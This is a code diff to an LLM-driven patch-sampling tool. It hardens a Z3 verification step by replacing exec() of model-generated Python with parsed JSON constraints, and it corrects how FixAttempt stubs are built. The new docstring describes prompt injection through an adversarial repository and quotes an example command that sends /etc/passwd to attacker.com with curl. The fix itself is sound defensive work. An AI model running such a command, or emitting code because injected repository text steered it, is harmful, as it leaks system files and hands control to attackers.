@@ -170,6 +170,10 @@ class BoBNCandidate:
     minimality:      PatchMinimalityScore | None = None
     composite_score: float  = 0.0
 
+    # ARCH-03 FIX: issue_ids populated by controller so _gap5_commit() can close
+    # the correct issue(s) without relying on getattr fallback.
+    issue_ids: list[str] = field(default_factory=list)
+
     # Filled after synthesis step (GAP 5 fix)
     synthesis_decision: SynthesisDecision | None = None
 
@@ -289,6 +293,9 @@ class BoBNSampler:
         repo_root:              Any | None                = None,
         domain_mode:            Any | None                = None,
         mutation_threshold:     float | None              = None,
+        # ARCH-02 FIX: accept cpg_engine so evaluator.py can pass the
+        # per-instance CPGEngine without it being silently ignored.
+        cpg_engine:             Any | None                = None,
     ) -> None:
         self.router       = model_router
         self.critic       = critic
@@ -306,6 +313,8 @@ class BoBNSampler:
         self._repo_root          = repo_root
         self._domain_mode        = domain_mode
         self._mutation_threshold = mutation_threshold
+        # ARCH-02 FIX: store cpg_engine so localization can use causal context.
+        self._cpg_engine         = cpg_engine
 
     async def sample(
         self,
@@ -800,6 +809,17 @@ class BoBNSampler:
         Ask the routing LLM to extract Z3 assertions for the patch's key
         invariants, then verify them with the z3-solver Python package.
 
+        SEC-01 FIX: The previous implementation called exec(z3_code, namespace)
+        on raw LLM output derived from repository source code. An adversarial
+        repository could embed content causing the LLM to emit arbitrary Python
+        (e.g. subprocess.run(['curl','attacker.com','-d',open('/etc/passwd').read()])).
+        exec() with no __builtins__ restriction and the full z3 namespace available
+        gave near-unrestricted code execution.
+
+        This implementation asks the LLM for structured JSON describing Z3
+        constraints and constructs the solver programmatically using the safe
+        z3.parse_smt2_string() API. LLM output is never executed.
+
         Returns True  — assertions are satisfiable or gate was skipped.
         Returns False — Z3 produced a concrete unsat result (counterexample).
         Raises RuntimeError for infrastructure failures (caller skips layer).
@@ -808,54 +828,86 @@ class BoBNSampler:
         if importlib.util.find_spec("z3") is None:
             raise RuntimeError("z3-solver not installed — Layer 3 skipped")
 
+        # Ask the LLM to return a safe JSON DSL, not executable Python.
         prompt = (
             "You are a formal verification assistant.\n"
-            "Given the patch below, extract at most 5 Z3 Python assertions "
-            "that capture the key safety invariants introduced by the fix.\n"
-            "Output ONLY valid Python code that imports z3 and uses "
-            "z3.Solver() or z3.solve().\n"
-            "Assign the solver result to a variable named `__z3_result__`.\n"
-            "If the patch is too simple or purely structural for SMT verification, "
-            "output exactly: # NO_ASSERTIONS\n\n"
+            "Given the patch below, extract at most 3 key safety invariants.\n"
+            "Return ONLY a JSON object with this exact schema:\n"
+            '{"variables": {"name": "Int|Bool"}, '
+            '"assertions": ["SMT-LIB2 assert expression as string"]}\n'
+            "Use only Int and Bool sorts. Use standard SMT-LIB2 syntax "
+            "(e.g. \"(>= x 0)\", \"(=> p q)\").\n"
+            "If the patch is too simple for SMT verification, return: "
+            '{"variables": {}, "assertions": []}\n\n'
             f"Patch:\n```diff\n{patch[:3000]}\n```"
         )
 
         try:
             import litellm
-            # Use synthesis_model() explicitly — primary_model("critical_fix") also
-            # resolves to VLLM_SYNTHESIS but using the named accessor is clearer
-            # and immune to future _TASK_TIERS remapping.
             resp = await litellm.acompletion(
                 model       = self.router.synthesis_model(),
                 messages    = [{"role": "user", "content": prompt}],
                 max_tokens  = 512,
                 temperature = 0.0,
             )
-            z3_code = resp.choices[0].message.content or ""
+            raw = resp.choices[0].message.content or ""
         except Exception as exc:
             raise RuntimeError(f"LLM extraction failed: {exc}") from exc
 
-        if "NO_ASSERTIONS" in z3_code or not z3_code.strip():
-            log.debug(f"[z3_gate] {instance_id}: LLM returned no assertions — skipping")
+        # Parse the JSON response — never eval/exec it.
+        import json, re
+        clean = re.sub(r"```(?:json)?\s*", "", raw).strip()
+        match = re.search(r"\{.*\}", clean, re.DOTALL)
+        if not match:
+            log.debug(f"[z3_gate] {instance_id}: LLM returned no JSON — skipping")
             return True
 
-        # Strip markdown fences before exec
-        z3_code = re.sub(r"```(?:python)?\s*", "", z3_code).strip()
-
-        namespace: dict = {}
         try:
-            exec(z3_code, namespace)  # noqa: S102
-        except Exception as exc:
-            raise RuntimeError(f"Z3 code exec error: {exc}") from exc
+            data = json.loads(match.group(0))
+        except json.JSONDecodeError:
+            return True
 
-        result = namespace.get("__z3_result__")
-        if result is not None:
-            try:
-                import z3
-                if result == z3.unsat:
-                    return False
-            except Exception:
-                pass  # z3 comparison failed — treat as skip
+        assertions: list[str] = data.get("assertions", [])
+        variables:  dict      = data.get("variables", {})
+
+        if not assertions:
+            log.debug(f"[z3_gate] {instance_id}: no assertions — skipping")
+            return True
+
+        # Construct Z3 solver from the safe JSON DSL without exec().
+        try:
+            import z3
+            sort_map = {"Int": z3.IntSort(), "Bool": z3.BoolSort()}
+            var_decls = []
+            for var_name, sort_name in variables.items():
+                sort = sort_map.get(sort_name, z3.IntSort())
+                # Emit SMT-LIB2 declare-const for each variable.
+                smt_sort = "Int" if sort == z3.IntSort() else "Bool"
+                var_decls.append(f"(declare-const {var_name} {smt_sort})")
+
+            for assertion_expr in assertions[:3]:
+                smt2 = (
+                    "\n".join(var_decls)
+                    + f"\n(assert (not {assertion_expr}))\n(check-sat)"
+                )
+                try:
+                    result = z3.parse_smt2_string(smt2)
+                    solver = z3.Solver()
+                    solver.add(result)
+                    if solver.check() == z3.sat:
+                        log.warning(
+                            f"[z3_gate] {instance_id}: Z3 counterexample for "
+                            f"assertion: {assertion_expr[:80]}"
+                        )
+                        return False
+                except Exception as exc:
+                    log.debug(
+                        f"[z3_gate] {instance_id}: Z3 parse failed for "
+                        f"'{assertion_expr[:60]}': {exc}"
+                    )
+                    continue
+        except Exception as exc:
+            raise RuntimeError(f"Z3 solver error: {exc}") from exc
 
         return True
 
@@ -927,13 +979,14 @@ class BoBNSampler:
                 domain_mode = self._domain_mode,
             )
 
-            # Build a minimal FixAttempt-like object that TestGeneratorAgent
-            # expects.  We only need the patch and a placeholder fix id.
+            # BLOCK-02 FIX: FixAttempt has no `issue_id` field (it is `issue_ids: list[str]`)
+            # and no `patch` field. Previously these unknown kwargs were silently ignored by
+            # Pydantic, producing a stub with issue_ids=[] and no file content, so
+            # TestGeneratorAgent and MutationVerifierAgent always received empty stubs.
             from brain.schemas import FixAttempt, FixedFile
             fix_stub = FixAttempt(
                 run_id      = effective_run_id,
-                issue_id    = instance_id,
-                patch       = winner.patch,
+                issue_ids   = [instance_id],
                 gate_passed = True,
                 fixed_files = _extract_fixed_files_from_patch(winner.patch),
             )
@@ -978,12 +1031,11 @@ class BoBNSampler:
                 score_threshold  = self._mutation_threshold,
             )
 
-            # Reuse or build the same FixAttempt stub for the mutation run.
+            # BLOCK-02 FIX: same correction — use issue_ids=[...] not issue_id=, remove patch=.
             from brain.schemas import FixAttempt
             fix_stub_mv = FixAttempt(
                 run_id      = effective_run_id,
-                issue_id    = instance_id,
-                patch       = winner.patch,
+                issue_ids   = [instance_id],
                 gate_passed = True,
                 fixed_files = _extract_fixed_files_from_patch(winner.patch),
             )
